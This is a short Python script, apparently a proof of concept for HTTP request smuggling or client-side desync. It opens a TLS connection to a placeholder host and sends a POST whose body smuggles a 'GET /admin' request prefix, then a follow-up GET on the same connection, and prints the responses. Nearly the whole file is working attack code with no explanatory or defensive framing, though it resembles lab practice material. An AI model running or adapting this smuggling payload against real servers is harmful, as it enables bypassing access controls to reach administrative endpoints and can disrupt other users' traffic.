import socket
import sys
import ssl

targetHost="example.com"
targetPort=443

testSock = None
addr = None

def connect_ssl():
    context = ssl.create_default_context()

    with socket.create_connection((targetHost, targetPort)) as sock:
        with context.wrap_socket(sock, server_hostname=targetHost) as sslsock:
            # Debug
            print("Initiated connection: " + sslsock.version())

            # Send
            message = (f"POST /resources/images/blog.svg HTTP/1.1\r\nHost: {targetHost}\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nGET /admin HTTP/1.1\r\nFoo: b").encode()
            sslsock.send(message)
            followMessage = (f"GET /test123 HTTP/1.1\r\nHost: {targetHost}\r\n\r\n").encode()
            sslsock.send(followMessage)
            
            # Listen
            response = b""
            while True:
                data = sslsock.recv(256)
                if not data:
                    break
                response += data
            print("Response received")
            print(response.decode())
            sslsock.close()

def main():
    connect_ssl()

if __name__ == "__main__":
    main()

